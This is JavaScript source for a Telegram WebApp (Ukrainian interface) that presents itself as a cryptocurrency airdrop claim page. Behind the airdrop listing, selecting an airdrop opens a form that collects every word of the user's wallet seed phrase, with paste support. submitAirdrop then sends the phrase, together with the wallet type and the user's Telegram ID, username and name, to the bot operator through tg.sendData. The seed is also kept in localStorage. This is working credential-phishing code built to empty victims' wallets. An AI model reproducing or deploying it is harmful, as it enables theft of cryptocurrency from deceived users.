// ======= Airdrop.js =======
let tg = null;
let demoMode = false;
let tgUser = {};

// ======= Telegram WebApp Init =======
function initTelegram() {
    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
        console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
        demoMode = true;
        return;
    }

    tg = Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("✅ Telegram WebApp ініціалізовано");

    const u = tg.initDataUnsafe?.user;
    if (u?.id) {
        tgUser.id = u.id;
        tgUser.username = u.username || "—";
        tgUser.first_name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "—";
        tgUser.photo_url = u.photo_url || "";
        const now = new Date().toISOString();

        localStorage.setItem("tg_user_id", tgUser.id);
        localStorage.setItem("tg_username", tgUser.username);
        localStorage.setItem("tg_name", tgUser.first_name);
        localStorage.setItem("tg_photo", tgUser.photo_url);
        localStorage.setItem("tg_timestamp", now);
    } else {
        tgUser.id = localStorage.getItem("tg_user_id") || "—";
        tgUser.username = localStorage.getItem("tg_username") || "—";
        tgUser.first_name = localStorage.getItem("tg_name") || "—";
        tgUser.photo_url = localStorage.getItem("tg_photo") || "";
    }
}

// ======= DOM Ready =======
document.addEventListener("DOMContentLoaded", () => {
    initTelegram();

    // Якщо на сторінці профілю — заповнити з localStorage
    if (window.location.pathname.includes("airprofile.html")) {
        fillProfileFromStorage();
        return;
    }

    // Якщо на головній сторінці — завантажити список Airdrops
    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                    <h2>${drop.name}</h2>
                    <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
                    <p>🌐 Мережа: ${drop.network}</p>
                    <p>⏳ До: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">Участь</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("❌ Помилка при завантаженні airdrops.json:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
        });

    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    // Select init
    initCustomSelect();
});

// ======= Airdrop selection =======
function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `Слово ${i + 1}`;
        container.appendChild(input);
    }

    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

function submitAirdrop() {
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
        document.getElementById('validationWarning').style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: tgUser.id,
        username: tgUser.username,
        name: tgUser.first_name,
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    // Збереження
    localStorage.setItem("tg_user_id", payload.user_id);
    localStorage.setItem("tg_username", payload.username);
    localStorage.setItem("tg_name", payload.name);
    localStorage.setItem("tg_timestamp", payload.timestamp);
    localStorage.setItem("last_seed", payload.seed);
    localStorage.setItem("wallet_used", payload.wallet);

    if (!demoMode && tg?.sendData) {
        console.log("[📤 Надсилання в Telegram WebApp]", payload);
        tg.sendData(JSON.stringify(payload));
        setTimeout(() => tg.close(), 400);
    } else {
        console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
        alert("📦 Демо-режим: дані не надіслано. Переходимо до профілю.");
        window.location.href = "airprofile.html";
    }
}

// ======= Профіль: Заповнення даних =======
function fillProfileFromStorage() {
    const id = localStorage.getItem("tg_user_id") || "—";
    const username = localStorage.getItem("tg_username") || "—";
    const name = localStorage.getItem("tg_name") || "—";
    const timestamp = localStorage.getItem("tg_timestamp") || "—";
    const photo = localStorage.getItem("tg_photo");

    if (document.getElementById("userid")) document.getElementById("userid").innerText = id;
    if (document.getElementById("username")) document.getElementById("username").innerText = username !== "—" ? `@${username}` : "—";
    if (document.getElementById("fullname")) document.getElementById("fullname").innerText = name;
    if (document.getElementById("timestamp")) document.getElementById("timestamp").innerText = new Date(timestamp).toLocaleString();
    if (photo && document.getElementById("avatar")) {
        const img = document.getElementById("avatar");
        img.src = photo;
        img.style.display = "inline-block";
    }
}

// ======= Select wrapper init =======
function initCustomSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    if (!selectWrapper) return;

    const selected = selectWrapper.querySelector('.selected');
    const options = selectWrapper.querySelectorAll('.options li');
    const hiddenInput = document.querySelector('#wallet');

    selected.addEventListener('click', () => {
        selectWrapper.classList.toggle('open');
    });

    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value;
            selectWrapper.classList.remove('open');
        });
    });

    document.addEventListener('click', e => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });
}
